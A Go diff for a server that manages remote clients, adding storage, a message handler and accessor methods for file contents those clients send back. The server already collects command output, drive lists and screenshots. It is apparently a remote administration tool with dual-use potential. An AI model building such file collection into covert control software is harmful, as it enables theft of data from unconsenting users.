@@ -32,6 +32,7 @@ type Server struct {
 	commandResults    map[string]*common.CommandResultPayload
 	fileListResults   map[string]*common.FileListPayload
 	driveListResults  map[string]*common.DriveListPayload
+	fileDataResults   map[string]*common.FileDataPayload
 	screenshotResults map[string]*common.ScreenshotDataPayload
 	resultsMu         sync.RWMutex
 }
@@ -79,6 +80,7 @@ func NewServer(config *Config) *Server {
 		commandResults:    make(map[string]*common.CommandResultPayload),
 		fileListResults:   make(map[string]*common.FileListPayload),
 		driveListResults:  make(map[string]*common.DriveListPayload),
+		fileDataResults:   make(map[string]*common.FileDataPayload),
 		screenshotResults: make(map[string]*common.ScreenshotDataPayload),
 	}
 
@@ -364,6 +366,17 @@ func (s *Server) handleMessage(client *Client, msg *common.Message) {
 			log.Printf("Drive list from %s", client.ID)
 		}
 
+	case common.MsgTypeFileData:
+		var fd common.FileDataPayload
+		if err := msg.ParsePayload(&fd); err == nil {
+			log.Printf("File data from %s: %s (%d bytes)", client.ID, fd.Path, len(fd.Data))
+			s.resultsMu.Lock()
+			s.fileDataResults[client.ID] = &fd
+			s.resultsMu.Unlock()
+		} else {
+			log.Printf("File data from %s", client.ID)
+		}
+
 	case common.MsgTypeScreenshotData:
 		var sd common.ScreenshotDataPayload
 		if err := msg.ParsePayload(&sd); err == nil {
@@ -518,6 +531,21 @@ func (s *Server) ClearScreenshotResult(clientID string) {
 	s.resultsMu.Lock()
 	defer s.resultsMu.Unlock()
 	delete(s.screenshotResults, clientID)
+}
+
+// GetFileDataResult retrieves stored file data result for a client
+func (s *Server) GetFileDataResult(clientID string) (*common.FileDataPayload, bool) {
+	s.resultsMu.RLock()
+	defer s.resultsMu.RUnlock()
+	result, exists := s.fileDataResults[clientID]
+	return result, exists
+}
+
+// ClearFileDataResult removes stored file data result
+func (s *Server) ClearFileDataResult(clientID string) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	delete(s.fileDataResults, clientID)
 }
 
 // monitorClientStatus monitors client status and updates database
